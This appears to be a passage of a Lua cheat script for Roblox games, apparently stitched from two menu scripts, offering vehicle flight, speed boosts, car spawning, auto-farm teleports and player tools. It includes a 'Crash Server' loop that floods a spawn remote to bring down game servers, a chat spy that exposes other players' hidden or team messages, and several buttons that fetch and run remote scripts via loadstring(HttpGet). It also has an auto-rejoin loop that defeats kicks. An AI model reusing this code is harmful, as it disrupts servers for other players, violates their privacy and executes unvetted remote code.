	local Character = LocalPlayer.Character
	if flightEnabled == true then
		if Character and typeof(Character) == "Instance" then
			local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
			if Humanoid and typeof(Humanoid) == "Instance" then
				local SeatPart = Humanoid.SeatPart
				if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
					local Vehicle = GetVehicleFromDescendant(SeatPart)
					if Vehicle and Vehicle:IsA("Model") then
						Character.Parent = Vehicle
						if not Vehicle.PrimaryPart then
							if SeatPart.Parent == Vehicle then
								Vehicle.PrimaryPart = SeatPart
							else
								Vehicle.PrimaryPart = Vehicle:FindFirstChildWhichIsA("BasePart")
							end
						end
						local PrimaryPartCFrame = Vehicle:GetPrimaryPartCFrame()
						Vehicle:SetPrimaryPartCFrame(CFrame.new(PrimaryPartCFrame.Position, PrimaryPartCFrame.Position + workspace.CurrentCamera.CFrame.LookVector) * (UserInputService:GetFocusedTextBox() and CFrame.new(0, 0, 0) or CFrame.new((UserInputService:IsKeyDown(Enum.KeyCode.D) and flightSpeed) or (UserInputService:IsKeyDown(Enum.KeyCode.A) and -flightSpeed) or 0, (UserInputService:IsKeyDown(Enum.KeyCode.E) and flightSpeed / 2) or (UserInputService:IsKeyDown(Enum.KeyCode.Q) and -flightSpeed / 2) or 0, (UserInputService:IsKeyDown(Enum.KeyCode.S) and flightSpeed) or (UserInputService:IsKeyDown(Enum.KeyCode.W) and -flightSpeed) or 0)))
						SeatPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
						SeatPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
					end
				end
			end
		end
	else
		if Character and typeof(Character) == "Instance" then
			Character.Parent = defaultCharacterParent or Character.Parent
			defaultCharacterParent = Character.Parent
		end
	end
end)
local speedSection = Page:addSection("Acceleration")
local velocityMult = 0.025;
speedSection:addSlider("Multiplier (Thousandths)", 25, 0, 50, function(v) velocityMult = v / 1000; end)
local velocityEnabledKeyCode = Enum.KeyCode.W;
speedSection:addKeybind("Velocity Enabled", velocityEnabledKeyCode, function()
	if not velocityEnabled then
		return
	end
	while UserInputService:IsKeyDown(velocityEnabledKeyCode) do
		task.wait(0)
		local Character = LocalPlayer.Character
		if Character and typeof(Character) == "Instance" then
			local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
			if Humanoid and typeof(Humanoid) == "Instance" then
				local SeatPart = Humanoid.SeatPart
				if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
					SeatPart.AssemblyLinearVelocity *= Vector3.new(1 + velocityMult, 1, 1 + velocityMult)
				end
			end
		end
		if not velocityEnabled then
			break
		end
	end
end, function(v) velocityEnabledKeyCode = v.KeyCode end)
local decelerateSelection = Page:addSection("Deceleration")
local qbEnabledKeyCode = Enum.KeyCode.S
local velocityMult2 = 150e-3
decelerateSelection:addSlider("Brake Force (Thousandths)", velocityMult2*1e3, 0, 300, function(v) velocityMult2 = v / 1000; end)
decelerateSelection:addKeybind("Quick Brake Enabled", qbEnabledKeyCode, function()
	if not velocityEnabled then
		return
	end
	while UserInputService:IsKeyDown(qbEnabledKeyCode) do
		task.wait(0)
		local Character = LocalPlayer.Character
		if Character and typeof(Character) == "Instance" then
			local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
			if Humanoid and typeof(Humanoid) == "Instance" then
				local SeatPart = Humanoid.SeatPart
				if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
					SeatPart.AssemblyLinearVelocity *= Vector3.new(1 - velocityMult2, 1, 1 - velocityMult2)
				end
			end
		end
		if not velocityEnabled then
			break
		end
	end
end, function(v) qbEnabledKeyCode = v.KeyCode end)
decelerateSelection:addKeybind("Stop the Vehicle", Enum.KeyCode.P, function(v)
	if not velocityEnabled then
		return
	end
	local Character = LocalPlayer.Character
	if Character and typeof(Character) == "Instance" then
		local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
		if Humanoid and typeof(Humanoid) == "Instance" then
			local SeatPart = Humanoid.SeatPart
			if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
				SeatPart.AssemblyLinearVelocity *= Vector3.new(0, 0, 0)
				SeatPart.AssemblyAngularVelocity *= Vector3.new(0, 0, 0)
			end
		end
	end
end)
local springSection = Page:addSection("Springs")
springSection:addToggle("Visible", false, function(v)
	local Character = LocalPlayer.Character
	if Character and typeof(Character) == "Instance" then
		local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
		if Humanoid and typeof(Humanoid) == "Instance" then
			local SeatPart = Humanoid.SeatPart
			if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
				local Vehicle = GetVehicleFromDescendant(SeatPart)
				for _, SpringConstraint in pairs(Vehicle:GetDescendants()) do
					if SpringConstraint:IsA("SpringConstraint") then
						SpringConstraint.Visible = v
					end
				end
			end
		end
	end
end)
repeat
	task.wait(0)
until game:IsLoaded() and game.PlaceId > 0
if game.PlaceId == 3351674303 then
	local drivingEmpirePage = Venyx:addPage("Wayfort", 8357222903)
	local dealershipSection = drivingEmpirePage:addSection("Vehicle Dealership")
	local dealershipList = {}
	for index, value in pairs(workspace:WaitForChild("Game"):WaitForChild("Dealerships"):WaitForChild("Dealerships"):GetChildren()) do
		table.insert(dealershipList, value.Name)
	end
	dealershipSection:addDropdown("Dealership", dealershipList, function(v)
		game:GetService("ReplicatedStorage").Remotes.Location:FireServer("Enter", v)
	end)
elseif game.PlaceId == 891852901 then
	local greenvillePage = Venyx:addPage("Greenville", 8360925727)
elseif game.PlaceId == 54865335 then
	local ultimateDrivingPage = Venyx:addPage("Westover", 8360954483)
elseif game.PlaceId == 5232896677 then
	local pacificoPage = Venyx:addPage("Pacifico", 3028235557)
end
local infoPage = Venyx:addPage("Information", 8356778308)
local discordSection = infoPage:addSection("Discord")
discordSection:addButton(syn and "Join the Discord server" or "Copy Discord Link", function()
	if syn then
		syn.request({
			Url = "http://127.0.0.1:6463/rpc?v=1",
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
				["Origin"] = "https://discord.com"
			},
			Body = game:GetService("HttpService"):JSONEncode({
				cmd = "INVITE_BROWSER",
				args = {
					code = "CRmfvVz4eB"
				},
				nonce = game:GetService("HttpService"):GenerateGUID(false)
			}),
		})
		return
	end
	setclipboard("https://www.discord.com/invite/CRmfvVz4eB")
end)
end)

local Section = Tab:NewSection("CAR")

end)

Section:NewButton("Toyota", " ",function()
    local args = {
        [1] = "Toyota"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

Section:NewButton("R35", " ",function()
    local args = {
        [1] = "R35"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

Section:NewButton("R34", " ",function()
    local args = {
        [1] = "R34"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

Section:NewButton("councilcar", " ",function()
    local args = {
        [1] = "councilcar"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

Section:NewButton("RX7", " ",function()
    local args = {
        [1] = "RX7"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

Section:NewButton("Lambo", " ",function()
    local args = {
        [1] = "Lambo"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

Section:NewButton("FordRanger", " ",function()
    local args = {
        [1] = "FordRanger"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

Section:NewButton("Ferrari488", " ",function()
    local args = {
        [1] = "Ferrari488"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

Section:NewButton("AUDI", " ",function()
    local args = {
        [1] = "Audi"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

Section:NewButton("Sport Car", " ",function()
    local args = {
        [1] = "SportCar"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

Section:NewButton("Buggy", " ",function()
    local args = {
        [1] = "Buggy"
        }
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
end)

local Section = Tab:NewSection("Crash Server")
Section:NewToggle("Start", " ",function(Crash)
    _G.Crash = (Crash)
end)

spawn(function()
	while wait() do
		if _G.Crash then
            local args = {
                [1] = "Toyota"
            }
            game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
            wait(0.01) 
            local args = {
                [1] = "R35"
            }   
            game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
            wait(0.01) 
            local args = {
                [1] = "R34"
            }   
            game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
            wait(0.01) 
            local args = {
                [1] = "councilcar"
            }
            game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
            wait(0.01) 
            local args = {
                [1] = "RX7"
            }
            game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
            wait(0.01) 
            local args = {
                [1] = "Lambo"
            }
            game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
            wait(0.01) 
            local args = {
                [1] = "FordRanger"
            }
            game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
            wait(0.01) 
            local args = {
                [1] = "Ferrari488"
            }
            game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
            wait(0.01) 
            local args = {
                [1] = "Audi"
            }
            game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
            wait(0.01) 
        end
    end   
end)

------------------------------------------------------------------------------------------

local Tab = Window:NewTab("Auto Farm")

local Section = Tab:NewSection("Auto Farm")

------------------------------------------------------------------------------------------

Section:NewToggle("Auto Farm iron", " ",function(iron)
    _G.iron = (iron) 
end)

spawn(function()
	while wait() do
		if _G.iron then
      local tpcows = game:GetService("Workspace")["ฟาร์มเหล็ก"] --copypath มา
      local part = tpcows:FindFirstChild("MESH-car") --ชื่อไอสัส

      if part and part:IsA("BasePart") then -- ไม่ต้องเปลี่ยน
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame
      end
      wait(0.1)
		else
		end
	end
end)

spawn(function()
	while wait() do
		if _G.iron then
      local tpcows = game:GetService("Workspace")["ฟาร์มเหล็ก"] --copypath มา
      local part = tpcows:FindFirstChild("bus") --ชื่อไอสัส

      if part and part:IsA("BasePart") then -- ไม่ต้องเปลี่ยน
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame
      end
      wait(0.1)
		else
		end
	end
end)

spawn(function()
	while wait() do
		if _G.iron then
      local tpcows = game:GetService("Workspace")["ฟาร์มเหล็ก"] --copypath มา
      local part = tpcows:FindFirstChild("Body") --ชื่อไอสัส

      if part and part:IsA("BasePart") then -- ไม่ต้องเปลี่ยน
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame
      end
      wait(0.1)
		else
		end
	end
end)

------------------------------------------------------------------------------------------

Section:NewToggle("Auto Farm Ore", " ",function(Ore)
    _G.Ore = (Ore) 
end)
  
spawn(function()
      while wait() do
          if _G.Ore then
        local tpcows = game:GetService("Workspace").Ore --copypath มา
        local part = tpcows:FindFirstChild("Ore") --ชื่อไอสัส
  
        if part and part:IsA("BasePart") then -- ไม่ต้องเปลี่ยน
          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame
        end
        wait(0.1)
        else
        end
    end
end)

------------------------------------------------------------------------------------------

Section:NewToggle("Auto Farm banana", " ",function(banana)
    _G.banana = (banana) 
end)
  
spawn(function()
	while wait() do
		if _G.banana then
      local tpcows = game:GetService("Workspace").Farm --copypath มา
      local part = tpcows:FindFirstChild("banana tree") --ชื่อไอสัส

      if part and part:IsA("BasePart") then -- ไม่ต้องเปลี่ยน
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame
      end
      wait(0.1)
		else
		end
	end
end)

------------------------------------------------------------------------------------------

local Tab = Window:NewTab("Auto")

local Section = Tab:NewSection("No Cooldown")

Section:NewButton("auto Interact [E] (Beta)", false,function()
    while wait() do
		while wait() do
            local virtualUser = game:GetService('VirtualUser')
            virtualUser:CaptureController()
            virtualUser:SetKeyDown('0x65')
            wait(0.01)
            virtualUser:SetKeyUp('0x65')
        end
    end
end)


Section:NewButton("Remove Cooldown", " ", function()
  game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(prompt)
      fireproximityprompt(prompt)
    end)
  end)

local Section = Tab:NewSection("Auto Equip")
 
local Weaponlist = {}
local Weapon = nil
 
for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
    table.insert(Weaponlist,v.Name)
end
 
Section:NewDropdown("select weapon", " ", Weaponlist, function(currentOption)
    Weapon = currentOption
end)
 
Section:NewToggle("Auto Equip", " ", function(a)
AutoEquiped = a
end)
 
spawn(function()
while wait() do
if AutoEquiped then
pcall(function()
game.Players.LocalPlayer.Character.Humanoid:EquipTool(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(Weapon))
end)
end
end
end)

Section:NewButton("Refresh (Beta)","Refresh", function()
  drop:Refresh(Weaponlist)
end)

------------------------------------------------------------------------------------------

local Tab = Window:NewTab("Teleport")

local Section = Tab:NewSection("Teleport")

Section:NewButton("Birth Point", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-145.288239, 6.70476389, 61.8986588, -0.124399871, -2.86770629e-09, -0.992232144, 6.43736753e-09, 1, -3.69723341e-09, 0.992232144, -6.84729873e-09, -0.124399871)
end)

Section:NewButton("Fish", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(11356.9072, 2.03106618, 1037.18213, -0.992339909, -2.45607641e-08, 0.12353757, -1.33807818e-08, 1, 9.13283316e-08, -0.12353757, 8.89757175e-08, -0.992339909)
end)

Section:NewButton("Crab", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6363.04932, 2.76954174, 1176.1936, 0.0268376507, -2.63189079e-08, -0.999639809, -4.73812207e-08, 1, -2.76004499e-08, 0.999639809, 4.81048836e-08, 0.0268376507)
end)

Section:NewButton("Pig", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2181.71045, 15.8695459, 1041.51843, -0.0629664287, 2.34285888e-08, 0.998015642, 7.91787542e-08, 1, -1.84796551e-08, -0.998015642, 7.78580329e-08, -0.0629664287)
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Section:NewButton("Click", "", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

------------------------------------------------------------------------------------------

local Tab = Window:NewTab("Player")

local Section = Tab:NewSection("Spectate Player")
Section:NewButton("Spectate", " ", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Spectate%20Player"))() end)

local Section = Tab:NewSection("Teleport Player !")
Plr = {}
for i,v in pairs(game:GetService("Players"):GetChildren()) do
    table.insert(Plr,v.Name) 
end

local drop = Section:NewDropdown("Select Player!", "Click To Select", (Plr), function(t)
   PlayerTP = (t)
end)
Section:NewButton("Teleport", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[PlayerTP].Character.HumanoidRootPart.CFrame
end)
Section:NewToggle("Auto Teleport", "", function(t)
_G.TPPlayer = (t)
while _G.TPPlayer do wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[PlayerTP].Character.HumanoidRootPart.CFrame
end
end)

Section:NewButton("Refresh (Beta)","Refresh", function()
  drop:Refresh(Plr)
end)

------------------------------------------------------------------------------------------

local Tab = Window:NewTab("Main") 

local Section = Tab:NewSection("Full Bright")

Section:NewButton("Click", " ", function()
    if not _G.FullBrightExecuted then

        _G.FullBrightEnabled = false
    
        _G.NormalLightingSettings = {
            Brightness = game:GetService("Lighting").Brightness,
            ClockTime = game:GetService("Lighting").ClockTime,
            FogEnd = game:GetService("Lighting").FogEnd,
            GlobalShadows = game:GetService("Lighting").GlobalShadows,
            Ambient = game:GetService("Lighting").Ambient
        }
    
        game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
            if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
                _G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
                if not _G.FullBrightEnabled then
                    repeat
                        wait()
                    until _G.FullBrightEnabled
                end
                game:GetService("Lighting").Brightness = 1
            end
        end)
    
        game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
            if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
                _G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
                if not _G.FullBrightEnabled then
                    repeat
                        wait()
                    until _G.FullBrightEnabled
                end
                game:GetService("Lighting").ClockTime = 12
            end
        end)
    
        game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
            if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
                _G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
                if not _G.FullBrightEnabled then
                    repeat
                        wait()
                    until _G.FullBrightEnabled
                end
                game:GetService("Lighting").FogEnd = 786543
            end
        end)
    
        game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
            if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
                _G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
                if not _G.FullBrightEnabled then
                    repeat
                        wait()
                    until _G.FullBrightEnabled
                end
                game:GetService("Lighting").GlobalShadows = false
            end
        end)
    
        game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
            if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
                _G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
                if not _G.FullBrightEnabled then
                    repeat
                        wait()
                    until _G.FullBrightEnabled
                end
                game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
            end
        end)
    
        game:GetService("Lighting").Brightness = 1
        game:GetService("Lighting").ClockTime = 12
        game:GetService("Lighting").FogEnd = 786543
        game:GetService("Lighting").GlobalShadows = false
        game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
    
        local LatestValue = true
        spawn(function()
            repeat
                wait()
            until _G.FullBrightEnabled
            while wait() do
                if _G.FullBrightEnabled ~= LatestValue then
                    if not _G.FullBrightEnabled then
                        game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
                        game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
                        game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
                        game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
                        game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
                    else
                        game:GetService("Lighting").Brightness = 1
                        game:GetService("Lighting").ClockTime = 12
                        game:GetService("Lighting").FogEnd = 786543
                        game:GetService("Lighting").GlobalShadows = false
                        game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
                    end
                    LatestValue = not LatestValue
                end
            end
        end)
    end
    
    _G.FullBrightExecuted = true
    _G.FullBrightEnabled = not _G.FullBrightEnabled
end)

local Section = Tab:NewSection("Chat SPY")
Section:NewButton("Click", "chat /spy to toggle!", function() 

enabled = true --chat "/spy" to toggle!
spyOnMyself = true --if true will check your messages too
public = false --if true will chat the logs publicly (fun, risky)
publicItalics = true --if true will use /me to stand out
privateProperties = { --customize private logs
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}


local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end)

local Section = Tab:NewSection("Server Hop")

Section:NewButton("Click", " ", function() 
    Time = 1 -- seconds
    repeat wait() until game:IsLoaded()
    wait(Time)
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    function TPReturner()
       local Site;
       if foundAnything == "" then
           Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
       else
           Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
       end
       local ID = ""
       if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
           foundAnything = Site.nextPageCursor
       end
       local num = 0;
       for i,v in pairs(Site.data) do
           local Possible = true
           ID = tostring(v.id)
           if tonumber(v.maxPlayers) > tonumber(v.playing) then
               for _,Existing in pairs(AllIDs) do
                   if num ~= 0 then
                       if ID == tostring(Existing) then
                           Possible = false
                       end
                   else
                       if tonumber(actualHour) ~= tonumber(Existing) then
                           local delFile = pcall(function()
                               delfile("NotSameServers.json")
                               AllIDs = {}
                               table.insert(AllIDs, actualHour)
                           end)
                       end
                   end
                   num = num + 1
               end
               if Possible == true then
                   table.insert(AllIDs, ID)
                   wait()
                   pcall(function()
                       writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                       wait()
                       game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                   end)
                   wait(4)
               end
           end
       end
    end
    
    function Teleport()
       while wait() do
           pcall(function()
               TPReturner()
               if foundAnything ~= "" then
                   TPReturner()
               end
           end)
       end
    end
    
    -- If you'd like to use a script before server hopping (Like a Automatic Chest collector you can put the Teleport() after it collected everything.
    Teleport()
end)


local Section = Tab:NewSection("Rejoin")

Section:NewButton("Click", "ออกเข้าใหม่", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/blox-fruit-fake-level-/main/Rejoin%20Game.lua"))() end)

local Section = Tab:NewSection("X-Ray")
Section:NewButton("Click", "Press X To X-Ray", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/X-Ray.lua"))() end)
		
local Section = Tab:NewSection("Infinite Yield")

Section:NewButton("Click", "เปิด Infinite Yield", function() loadstring(game:HttpGet(("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"),true ))() end)

local Section = Tab:NewSection("Anit AFK")
  
Section:NewButton("Click", "เปิด Anit AFK", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Roblox-Script-AFK/main/Script%20AFK.lua"))() end)

local Section = Tab:NewSection("Remove Fog")
  
Section:NewButton("Click", "", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Remove%20Fog.lua"))() end)

------------------------------------------------------------------------------------------

local Tab = Window:NewTab("Script Hub")

local Section = Tab:NewSection("Emotes")
Section:NewButton("Click", "press to </ม to Open", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/peatchXD/Build-A-Boat-For-Treasure/main/Emotes.lua"))() end)

local Section = Tab:NewSection("Orca")
Section:NewButton("Click", " ", function() loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/peatchXD/Main/main/Orca"))()end)

local Section = Tab:NewSection("Infinite Yield")
Section:NewButton("Click", "เปิด Infinite Yield", function() loadstring(game:HttpGet(("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"),true ))() end)

------------------------------------------------------------------------------------------

local Tab = Window:NewTab("credit") 
local Section = Tab:NewSection("By: peatchXD#6075")
Section:NewKeybind("press to change button", "KeybindInfo", Enum.KeyCode.F, function() Library:ToggleUI() end)  

------------------------------------------------------------------------------------------
-- Auto Rejoin Kicked --

repeat wait() until game.CoreGui:FindFirstChild('RobloxPromptGui')
 
local lp,po,ts = game:GetService('Players').LocalPlayer,game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')
 
po.ChildAdded:connect(function(a)
    if a.Name == 'ErrorPrompt' then
        repeat
            ts:Teleport(game.PlaceId)
            wait(2)
        until false
    end
end)

------------------------------------------------------------------------------------------
